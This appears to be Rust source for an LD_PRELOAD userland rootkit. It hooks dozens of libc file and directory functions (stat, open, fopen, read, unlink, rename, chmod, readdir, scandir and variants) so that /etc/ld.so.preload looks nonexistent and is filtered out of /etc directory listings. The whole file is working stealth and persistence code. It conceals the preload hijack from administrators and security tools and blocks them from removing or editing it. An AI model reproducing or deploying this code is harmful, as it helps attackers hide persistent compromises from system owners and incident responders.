extern crate libc;
extern crate errno;
use libc::{c_uint, EBADF};
use libc::{c_char, c_int, ENOENT};
use errno::set_errno;
use errno::Errno;
use std::cell::RefCell;
use std::{ffi::CStr, fs};
use log::{info, warn};

pub fn handle_rename(
    oldpath: *const c_char,
    newpath: *const c_char,
    chain: &mut crate::rename::Chain,
) -> c_int {
    let old_path = unsafe { CStr::from_ptr(oldpath) };
    let new_path = unsafe { CStr::from_ptr(newpath) };

    info!("[rename] old: {:?}, new: {:?}", old_path, new_path);

    if old_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[rename] Prevented renaming of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(oldpath, newpath)
}

pub fn handle_stat(path: *const c_char, buf: *mut libc::stat, chain: &mut crate::stat::Chain) -> c_int {
    let path_str = unsafe { CStr::from_ptr(path) };

    info!("[stat] path: {:?}", path_str);

    if path_str.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[stat] Hiding /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(path, buf)
}

pub fn handle_access(path: *const c_char, mode: c_int, chain: &mut crate::access::Chain) -> c_int {
    let path_str = unsafe { CStr::from_ptr(path) };

    info!("[access] path: {:?}, mode: {}", path_str, mode);

    if path_str.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[access] Prevented access to /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(path, mode)
}

pub fn handle_realpath(
    path: *const c_char,
    resolved_path: *mut c_char,
    chain: &mut crate::realpath::Chain,
) -> *mut c_char {
    let path_str = unsafe { CStr::from_ptr(path) };

    info!("[realpath] path: {:?}", path_str);

    if path_str.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[realpath] Prevented resolution of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return std::ptr::null_mut();
    }
    chain.call(path, resolved_path)
}

pub fn handle_open(cpath: *const c_char, oflag: c_int, chain: &mut crate::open::Chain) -> c_int {
    let path = unsafe { CStr::from_ptr(cpath) };

    info!("[open] path: {:?}", path);

    if path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[open] Prevented opening of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(cpath, oflag)
}

pub fn handle_open64(cpath: *const c_char, oflag: c_int, chain: &mut crate::open64::Chain) -> c_int {
    let path = unsafe { CStr::from_ptr(cpath) };

    info!("[open64] path: {:?}", path);

    if path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[open64] Prevented opening of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(cpath, oflag)
}

pub fn handle_openat(
    dirfd: c_int,
    cpath: *const c_char,
    oflag: c_int,
    chain: &mut crate::openat::Chain,
) -> c_int {
    let resolved_path = crate::resolve_fd_path(dirfd, cpath).unwrap_or_default();
    info!("[openat] dirfd: {}, resolved path: {:?}", dirfd, resolved_path);

    if resolved_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[openat] Prevented opening of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(dirfd, cpath, oflag)
}

pub fn handle_openat64(
    dirfd: c_int,
    cpath: *const c_char,
    oflag: c_int,
    chain: &mut crate::openat64::Chain,
) -> c_int {
    let resolved_path = crate::resolve_fd_path(dirfd, cpath).unwrap_or_default();
    info!("[openat64] dirfd: {}, resolved path: {:?}", dirfd, resolved_path);

    if resolved_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[openat64] Prevented opening of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(dirfd, cpath, oflag)
}

pub fn handle_fopen(
    cpath: *const c_char,
    mode: *const c_char,
    chain: &mut crate::fopen::Chain,
) -> *mut libc::FILE {
    let path = unsafe { CStr::from_ptr(cpath) };
    info!("[fopen] path: {:?}", path);

    if path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[fopen] Prevented opening of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return std::ptr::null_mut();
    }
    chain.call(cpath, mode)
}

pub fn handle_fopen64(
    cpath: *const c_char,
    mode: *const c_char,
    chain: &mut crate::fopen64::Chain,
) -> *mut libc::FILE {
    let path = unsafe { CStr::from_ptr(cpath) };
    info!("[fopen64] path: {:?}", path);

    if path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[fopen64] Prevented opening of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return std::ptr::null_mut();
    }
    chain.call(cpath, mode)
}

pub fn handle_read(
    fd: c_int,
    buf: *mut libc::c_void,
    count: usize,
    chain: &mut crate::read::Chain,
) -> isize {
    info!("[read] fd: {}, count: {}", fd, count);

    let fd_path = format!("/proc/self/fd/{}", fd);
    let link_path = fs::read_link(&fd_path).unwrap_or_default();
    if link_path.as_os_str() == "/etc/ld.so.preload" {
        warn!("[read] Prevented reading from /etc/ld.so.preload");
        set_errno(Errno(EBADF));
        return -1;
    }

    chain.call(fd, buf, count)
}

pub fn handle_chmod(
    path: *const c_char,
    mode: libc::mode_t,
    chain: &mut crate::chmod::Chain,
) -> c_int {
    let path_str = unsafe { CStr::from_ptr(path) };
    info!("[chmod] path: {:?}", path_str);

    if path_str.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[chmod] Prevented chmod on /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(path, mode)
}

pub fn handle_fchmod(fd: c_int, mode: libc::mode_t, chain: &mut crate::fchmod::Chain) -> c_int {
    let fd_path = format!("/proc/self/fd/{}", fd);
    let link_path = fs::read_link(&fd_path).unwrap_or_default();
    info!("[fchmod] fd: {}, resolved path: {:?}", fd, link_path);

    if link_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[fchmod] Prevented fchmod on /etc/ld.so.preload");
        set_errno(Errno(libc::EBADF));
        return -1;
    }
    chain.call(fd, mode)
}

pub fn handle_fchmodat(
    dirfd: c_int,
    path: *const c_char,
    mode: libc::mode_t,
    flags: c_int,
    chain: &mut crate::fchmodat::Chain,
) -> c_int {
    let resolved_path = crate::resolve_fd_path(dirfd, path).unwrap_or_default();
    info!("[fchmodat] dirfd: {}, resolved path: {:?}", dirfd, resolved_path);

    if resolved_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[fchmodat] Prevented fchmodat on /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(dirfd, path, mode, flags)
}

pub fn handle_unlink(path: *const c_char, chain: &mut crate::unlink::Chain) -> c_int {
    let path_str = unsafe { CStr::from_ptr(path) };
    info!("[unlink] path: {:?}", path_str);

    if path_str.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[unlink] Prevented unlink of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(path)
}

pub fn handle_unlinkat(
    dirfd: c_int,
    path: *const c_char,
    flags: c_int,
    chain: &mut crate::unlinkat::Chain,
) -> c_int {
    let resolved_path = crate::resolve_fd_path(dirfd, path).unwrap_or_default();
    info!("[unlinkat] dirfd: {}, resolved path: {:?}", dirfd, resolved_path);

    if resolved_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[unlinkat] Prevented unlinkat of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(dirfd, path, flags)
}

pub fn handle_renameat(
    olddirfd: c_int,
    oldpath: *const c_char,
    newdirfd: c_int,
    newpath: *const c_char,
    chain: &mut crate::renameat::Chain,
) -> c_int {
    let old_resolved = crate::resolve_fd_path(olddirfd, oldpath).unwrap_or_default();
    let new_resolved = crate::resolve_fd_path(newdirfd, newpath).unwrap_or_default();
    info!("[renameat] old: {:?}, new: {:?}", old_resolved, new_resolved);

    if old_resolved.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[renameat] Prevented renaming of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(olddirfd, oldpath, newdirfd, newpath)
}

pub fn handle_lstat(
    path: *const c_char,
    buf: *mut libc::stat,
    chain: &mut crate::lstat::Chain,
) -> c_int {
    let path_str = unsafe { CStr::from_ptr(path) };
    info!("[lstat] path: {:?}", path_str);

    if path_str.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[lstat] Hiding /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(path, buf)
}

pub fn handle_fstat(fd: c_int, buf: *mut libc::stat, chain: &mut crate::fstat::Chain) -> c_int {
    let fd_path = format!("/proc/self/fd/{}", fd);
    let link_path = fs::read_link(&fd_path).unwrap_or_default();
    info!("[fstat] fd: {}, resolved path: {:?}", fd, link_path);

    if link_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[fstat] Prevented fstat on /etc/ld.so.preload");
        set_errno(Errno(libc::EBADF));
        return -1;
    }
    chain.call(fd, buf)
}

pub fn handle_fstatat(
    dirfd: c_int,
    path: *const c_char,
    buf: *mut libc::stat,
    flags: c_int,
    chain: &mut crate::fstatat::Chain,
) -> c_int {
    let resolved_path = crate::resolve_fd_path(dirfd, path).unwrap_or_default();
    info!("[fstatat] dirfd: {}, resolved path: {:?}", dirfd, resolved_path);

    if resolved_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[fstatat] Prevented fstatat on /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(dirfd, path, buf, flags)
}

pub fn handle_statx(
    dirfd: c_int,
    path: *const c_char,
    flags: c_int,
    mask: c_uint,
    buf: *mut libc::statx,
    chain: &mut crate::statx::Chain,
) -> c_int {
    let resolved_path = crate::resolve_fd_path(dirfd, path).unwrap_or_default();
    info!("[statx] dirfd: {}, resolved path: {:?}", dirfd, resolved_path);

    if resolved_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[statx] Prevented statx on /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(dirfd, path, flags, mask, buf)
}

pub fn handle_faccessat(
    dirfd: c_int,
    path: *const c_char,
    mode: c_int,
    flags: c_int,
    chain: &mut crate::faccessat::Chain,
) -> c_int {
    let resolved_path = crate::resolve_fd_path(dirfd, path).unwrap_or_default();
    info!("[faccessat] dirfd: {}, resolved path: {:?}", dirfd, resolved_path);

    if resolved_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[faccessat] Prevented faccessat on /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return -1;
    }
    chain.call(dirfd, path, mode, flags)
}

pub fn handle_pread(
    fd: c_int,
    buf: *mut libc::c_void,
    count: usize,
    offset: libc::off_t,
    chain: &mut crate::pread::Chain,
) -> isize {
    let fd_path = format!("/proc/self/fd/{}", fd);
    let link_path = fs::read_link(&fd_path).unwrap_or_default();
    info!("[pread] fd: {}, resolved path: {:?}", fd, link_path);

    if link_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[pread] Prevented pread on /etc/ld.so.preload");
        set_errno(Errno(libc::EBADF));
        return -1;
    }
    chain.call(fd, buf, count, offset)
}

pub fn handle_readdir(
    dirp: *mut libc::DIR,
    chain: &mut crate::readdir::Chain,
) -> *mut libc::dirent {
    use std::ffi::CStr;
    use std::fs;

    unsafe {
        let fd = libc::dirfd(dirp);
        let fd_path = format!("/proc/self/fd/{}", fd);
        let dir_path = fs::read_link(&fd_path).unwrap_or_default();

        info!("[readdir] Directory path resolved: {:?}", dir_path);

        if dir_path.as_os_str() == "/etc" {
            loop {
                let entry = chain.call(dirp);
                if entry.is_null() {
                    return std::ptr::null_mut();
                }

                let d_name = CStr::from_ptr((*entry).d_name.as_ptr());

                if d_name.to_string_lossy() != "ld.so.preload" {
                    return entry;
                } else {
                    warn!("[readdir] Skipping entry: ld.so.preload");
                }
            }
        }
    }
    chain.call(dirp)
}

pub fn handle_readdir64(
    dirp: *mut libc::DIR,
    chain: &mut crate::readdir64::Chain,
) -> *mut libc::dirent64 {
    use std::ffi::CStr;
    use std::fs;

    unsafe {
        let fd = libc::dirfd(dirp);
        let fd_path = format!("/proc/self/fd/{}", fd);
        let dir_path = fs::read_link(&fd_path).unwrap_or_default();

        info!("[readdir64] Directory path resolved: {:?}", dir_path);

        if dir_path.as_os_str() == "/etc" {
            loop {
                let entry = chain.call(dirp);
                if entry.is_null() {
                    return std::ptr::null_mut();
                }

                let d_name = CStr::from_ptr((*entry).d_name.as_ptr());

                if d_name.to_string_lossy() != "ld.so.preload" {
                    return entry;
                } else {
                    warn!("[readdir64] Skipping entry: ld.so.preload");
                }
            }
        }
    }
    chain.call(dirp)
}

thread_local! {
    static ORIGINAL_FILTER: RefCell<Option<unsafe extern "C" fn(*const libc::dirent) -> libc::c_int>> = RefCell::new(None);
}

pub fn handle_scandir(
    dir: *const c_char,
    namelist: *mut *mut *mut libc::dirent,
    filter: Option<unsafe extern "C" fn(*const libc::dirent) -> c_int>,
    compar: Option<unsafe extern "C" fn(*const libc::dirent, *const libc::dirent) -> c_int>,
    chain: &mut crate::scandir::Chain,
) -> c_int {
    unsafe {
        let path_str = CStr::from_ptr(dir).to_string_lossy();
        info!("[scandir] Directory path: {:?}", path_str);

        if path_str == "/etc" {
            pub unsafe extern "C" fn custom_filter(entry: *const libc::dirent) -> libc::c_int {
                use std::ffi::CStr;

                let d_name = unsafe { CStr::from_ptr((*entry).d_name.as_ptr()) };

                if d_name.to_string_lossy() == "ld.so.preload" {
                    warn!("[scandir] Excluding entry: ld.so.preload");
                    return 0;
                }

                ORIGINAL_FILTER.with(|f| {
                    if let Some(original_filter) = *f.borrow() {
                        return unsafe { original_filter(entry) };
                    }
                    1
                })
            }

            ORIGINAL_FILTER.with(|f| *f.borrow_mut() = filter);
            return chain.call(dir, namelist, Some(custom_filter), compar);
        }
    }
    chain.call(dir, namelist, filter, compar)
}

pub fn handle_scandir64(
    dir: *const c_char,
    namelist: *mut *mut *mut libc::dirent64,
    filter: Option<unsafe extern "C" fn(*const libc::dirent64) -> c_int>,
    compar: Option<unsafe extern "C" fn(*const libc::dirent64, *const libc::dirent64) -> c_int>,
    chain: &mut crate::scandir64::Chain,
) -> c_int {
    unsafe {
        let path_str = CStr::from_ptr(dir).to_string_lossy();
        info!("[scandir64] Directory path: {:?}", path_str);

        if path_str == "/etc" {
            pub unsafe extern "C" fn custom_filter(entry: *const libc::dirent64) -> libc::c_int {
                use std::ffi::CStr;

                let d_name = unsafe { CStr::from_ptr((*entry).d_name.as_ptr()) };

                if d_name.to_string_lossy() == "ld.so.preload" {
                    warn!("[scandir64] Excluding entry: ld.so.preload");
                    return 0;
                }

                ORIGINAL_FILTER.with(|f| {
                    if let Some(original_filter) = *f.borrow() {
                        return unsafe {
                            std::mem::transmute::<_, unsafe extern "C" fn(*const libc::dirent64) -> c_int>(
                                original_filter,
                            )(entry)
                        };
                    }
                    1
                })
            }

            ORIGINAL_FILTER.with(|f| *f.borrow_mut() = filter.map(|f| std::mem::transmute(f)));
            return chain.call(dir, namelist, Some(custom_filter), compar);
        }
    }
    chain.call(dir, namelist, filter, compar)
}

